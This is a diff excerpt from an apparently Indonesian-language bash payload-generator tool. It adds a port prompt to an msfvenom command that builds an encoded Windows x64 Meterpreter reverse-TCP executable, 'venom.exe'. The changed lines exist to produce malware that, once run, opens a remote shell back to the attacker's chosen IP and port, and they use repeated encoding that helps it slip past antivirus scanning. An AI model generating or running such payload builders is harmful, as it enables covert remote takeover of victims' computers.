@@ -249,7 +249,9 @@ sleep 5
 ifconfig
 echo "╭─[Masukan IP Address Komputer/Laptop]" | lolcat
 read -p"╰─>> " lhost
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=9999 -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
+echo "╭─[Masukan PORT]" | lolcat
+read -p"╰─>> " port
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$port -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
 fi
 
 if [ $pil = j ]
